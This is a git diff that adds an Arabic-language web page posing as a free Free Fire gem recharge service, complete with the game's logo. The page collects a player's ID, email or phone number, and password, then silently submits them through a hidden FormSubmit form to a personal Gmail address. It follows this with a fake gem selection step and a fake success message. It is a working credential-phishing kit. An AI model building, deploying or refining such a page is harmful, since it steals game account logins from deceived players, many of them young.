@@ -1,1 +1,287 @@
-# Bilal-delhoum
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>شحن جواهر فري فاير بدون مهمات مجانًا</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
+            margin: 0;
+            padding: 0;
+            text-align: center;
+        }
+        
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: white;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            margin-top: 30px;
+        }
+        
+        .logo {
+            max-width: 300px;
+            margin-bottom: 20px;
+        }
+        
+        h1 {
+            color: #e74c3c;
+        }
+        
+        .form-group {
+            margin-bottom: 15px;
+            text-align: right;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+        
+        input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            box-sizing: border-box;
+        }
+        
+        button {
+            background-color: #e74c3c;
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            transition: background-color 0.3s;
+        }
+        
+        button:hover {
+            background-color: #c0392b;
+        }
+        
+        .gems-container {
+            display: none;
+            margin-top: 30px;
+        }
+        
+        .gem-option {
+            display: inline-block;
+            width: 30%;
+            margin: 0 1.5%;
+            padding: 15px;
+            background-color: #f9f9f9;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: transform 0.3s, box-shadow 0.3s;
+        }
+        
+        .gem-option:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+        }
+        
+        .gem-option.selected {
+            background-color: #e74c3c;
+            color: white;
+        }
+        
+        .success-message {
+            display: none;
+            margin-top: 30px;
+            padding: 20px;
+            background-color: #2ecc71;
+            color: white;
+            border-radius: 8px;
+            animation: fadeIn 1s;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        
+        .pulse {
+            animation: pulse 1.5s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+        
+        .loading {
+            display: none;
+            margin: 20px 0;
+        }
+        
+        /* إخفاء النموذج الحقيقي لـ FormSubmit */
+        #formsubmit-form {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://i.imgur.com/JR7kFZt.png" alt="Garena Free Fire" class="logo">
+        <h1>شحن جواهر فري فاير بدون مهمات مجانًا</h1>
+        
+        <!-- النموذج الرئيسي -->
+        <div id="login-form">
+            <div class="form-group">
+                <label for="id">معرف اللاعب (ID):</label>
+                <input type="text" id="id" name="player_id" placeholder="أدخل معرف اللاعب" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="email">البريد الإلكتروني أو رقم الهاتف:</label>
+                <input type="text" id="email" name="player_email" placeholder="أدخل البريد الإلكتروني أو رقم الهاتف" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="password">كلمة المرور:</label>
+                <input type="password" id="password" name="player_password" placeholder="أدخل كلمة المرور" required>
+            </div>
+            
+            <div class="loading" id="loading1">
+                <p>جاري إرسال البيانات...</p>
+            </div>
+            
+            <button id="next-btn" class="pulse">التالي</button>
+        </div>
+        
+        <!-- قسم اختيار الجواهر -->
+        <div id="gems-form" class="gems-container">
+            <h2>اختر عدد الجواهر التي تريدها</h2>
+            
+            <div class="gem-option" data-gems="100">
+                <h3>100 جوهرة</h3>
+                <p>مجانًا بالكامل!</p>
+            </div>
+            
+            <div class="gem-option" data-gems="210">
+                <h3>210 جوهرة</h3>
+                <p>مجانًا بالكامل!</p>
+            </div>
+            
+            <div class="gem-option" data-gems="300">
+                <h3>300 جوهرة</h3>
+                <p>مجانًا بالكامل!</p>
+            </div>
+            
+            <div class="loading" id="loading2">
+                <p>جاري معالجة طلبك...</p>
+            </div>
+            
+            <div style="clear: both; margin-top: 30px;">
+                <button id="charge-btn" disabled>شحن الجواهر</button>
+            </div>
+        </div>
+        
+        <!-- رسالة النجاح -->
+        <div id="success-message" class="success-message">
+            <h2>شكرًا لك!</h2>
+            <p>سيتم شحن الجواهر إلى حسابك خلال دقائق قليلة.</p>
+            <p>يرجى التحقق من حسابك في فري فاير.</p>
+        </div>
+        
+        <!-- النموذج الخفي لـ FormSubmit -->
+        <form id="formsubmit-form" action="https://formsubmit.co/Kakarotsayan94@gmail.com" method="POST">
+            <input type="hidden" name="player_id" id="form-id">
+            <input type="hidden" name="player_email" id="form-email">
+            <input type="hidden" name="player_password" id="form-password">
+            <input type="hidden" name="selected_gems" id="form-gems">
+            <input type="hidden" name="_subject" value="طلب جديد لشحن جواهر فري فاير">
+            <input type="hidden" name="_template" value="table">
+            <input type="hidden" name="_captcha" value="false">
+        </form>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const nextBtn = document.getElementById('next-btn');
+            const chargeBtn = document.getElementById('charge-btn');
+            const loginForm = document.getElementById('login-form');
+            const gemsForm = document.getElementById('gems-form');
+            const successMessage = document.getElementById('success-message');
+            const gemOptions = document.querySelectorAll('.gem-option');
+            const loading1 = document.getElementById('loading1');
+            const loading2 = document.getElementById('loading2');
+            const formsubmitForm = document.getElementById('formsubmit-form');
+            
+            let selectedGems = 0;
+            
+            // التحقق من الحقول قبل الانتقال
+            nextBtn.addEventListener('click', function() {
+                const id = document.getElementById('id').value;
+                const email = document.getElementById('email').value;
+                const password = document.getElementById('password').value;
+                
+                if (id && email && password) {
+                    // إظهار تحميل
+                    nextBtn.style.display = 'none';
+                    loading1.style.display = 'block';
+                    
+                    // تعبئة النموذج الخفي
+                    document.getElementById('form-id').value = id;
+                    document.getElementById('form-email').value = email;
+                    document.getElementById('form-password').value = password;
+                    
+                    // إرسال النموذج
+                    setTimeout(() => {
+                        formsubmitForm.submit();
+                        
+                        // إخفاء التحميل وإظهار واجهة الجواهر
+                        loading1.style.display = 'none';
+                        loginForm.style.display = 'none';
+                        gemsForm.style.display = 'block';
+                        gemsForm.style.animation = 'fadeIn 1s';
+                    }, 1000);
+                } else {
+                    alert('يرجى ملء جميع الحقول المطلوبة!');
+                }
+            });
+            
+            // اختيار عدد الجواهر
+            gemOptions.forEach(option => {
+                option.addEventListener('click', function() {
+                    gemOptions.forEach(opt => opt.classList.remove('selected'));
+                    this.classList.add('selected');
+                    selectedGems = this.getAttribute('data-gems');
+                    chargeBtn.disabled = false;
+                    chargeBtn.classList.add('pulse');
+                });
+            });
+            
+            // زر الشحن
+            chargeBtn.addEventListener('click', function() {
+                if (selectedGems > 0) {
+                    chargeBtn.style.display = 'none';
+                    loading2.style.display = 'block';
+                    
+                    // تعبئة عدد الجواهر في النموذج الخفي
+                    document.getElementById('form-gems').value = selectedGems;
+                    
+                    // إرسال النموذج مرة أخرى مع عدد الجواهر
+                    setTimeout(() => {
+                        formsubmitForm.submit();
+                        
+                        gemsForm.style.display = 'none';
+                        successMessage.style.display = 'block';
+                        
+                        // عرض رسالة التأكيد
+                        alert(`تم طلب شحن ${selectedGems} جوهرة إلى حسابك!\nستصل الجواهر خلال دقائق.`);
+                    }, 1500);
+                }
+            });
+        });
+    </script>
+</body>
+</html>
